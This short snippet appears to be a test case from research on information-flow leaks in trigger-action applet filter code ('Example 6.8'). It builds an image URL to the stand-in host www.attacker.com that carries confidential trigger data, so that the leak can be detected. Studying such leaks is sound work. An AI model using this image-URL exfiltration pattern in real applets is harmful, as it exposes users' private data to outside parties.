// Filter code in Example 6.8
// Maker: ---
// Link : ---

// Trigger: ---
// Action: ---

// Policy/Presence: Confidentiality of trigger data / Yes

h = true;
sink('Sink', '', imgl("www.attacker.com") + imgh('w'));
if (h) {
	sink('Sink', '', imgh('source'));
}
